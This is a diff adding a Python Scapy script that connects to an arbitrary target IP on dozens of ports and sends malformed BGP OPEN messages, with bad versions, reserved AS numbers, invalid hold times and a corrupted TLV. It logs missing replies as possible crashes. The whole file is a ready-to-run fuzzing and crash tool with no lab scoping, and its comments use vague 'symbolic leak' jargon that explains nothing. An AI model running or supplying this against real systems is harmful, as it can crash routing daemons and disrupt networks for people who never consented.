@@ -1,0 +1,76 @@
+
+from scapy.all import *
+from scapy.contrib.bgp import *
+import random
+import time
+import socket
+
+def get_port_name(port):
+    try:
+        return socket.getservbyport(port)
+    except:
+        return "unknown"
+
+def send_symbolic_leak_fuzz(dst_ip):
+    ip = IP(dst=dst_ip)
+    fuzz_cases = []
+
+    # Build aggressive fuzz patterns
+    versions = range(0, 6)
+    ases = [0, 64512, 65000, 65535]
+    holds = [0, 90, 255]
+    opt_lens = [0, 10, 255]
+
+    for version in versions:
+        for asn in ases:
+            for hold in holds:
+                for opt_len in opt_lens:
+                    fuzz_cases.append((version, asn, hold, opt_len))
+
+    # Aggressive destination ports to trigger symbolic mapping
+    fuzz_ports = list(range(32760, 32820)) + list(range(49152, 49172)) + [
+        601, 666, 999, 12345, 31337, 8081, 1234, 4321, 9090
+    ]
+
+    idx = 0
+    for dport in fuzz_ports:
+        port_label = get_port_name(dport)
+        for version, asn, hold, opt_len in fuzz_cases:
+            src_port = RandShort()
+            syn = TCP(sport=src_port, dport=dport, flags='S', seq=1000)
+            syn_ack = sr1(ip/syn, timeout=2, verbose=0)
+
+            if not syn_ack or not syn_ack.haslayer(TCP) or syn_ack[TCP].flags != 'SA':
+                print(f"[{idx}] [!] No SYN-ACK → Port {dport} ({port_label}) possibly filtered or rejected.")
+                idx += 1
+                continue
+
+            ack = TCP(sport=src_port, dport=dport, flags='A', seq=syn_ack.ack, ack=syn_ack.seq + 1)
+            send(ip/ack, verbose=0)
+
+            # Craft intentionally malformed TLV
+            bgp_open = BGPHeader(type=1)/BGPOpen(
+                version=version,
+                my_as=asn,
+                hold_time=hold,
+                bgp_id=".".join(str(random.randint(1, 254)) for _ in range(4)),
+                opt_param_len=opt_len
+            )/Raw(load=bytes([0x02, 0x01, 0xFF, 0x03, 0x01, 0x01, 0x7F]))
+
+            pkt = ip/TCP(sport=src_port, dport=dport, flags='PA', seq=ack.seq, ack=ack.ack)/bgp_open
+            print(f"[{idx}] [+] Fuzzing version={version}, ASN={asn}, hold={hold}, opt_len={opt_len} → Port {dport} ({port_label})")
+            response = sr1(pkt, timeout=2, verbose=0)
+
+            if response:
+                print(f"[{idx}] [🔥] Response: {response.summary()}")
+            else:
+                print(f"[{idx}] [💀] No response (possible crash or symbolic resolution failure)")
+            idx += 1
+            time.sleep(0.25)
+
+if __name__ == "__main__":
+    import sys
+    if len(sys.argv) < 2:
+        print("Usage: sudo python3 symbolic_fuzz.py <target_ip>")
+        sys.exit(1)
+    send_symbolic_leak_fuzz(sys.argv[1])
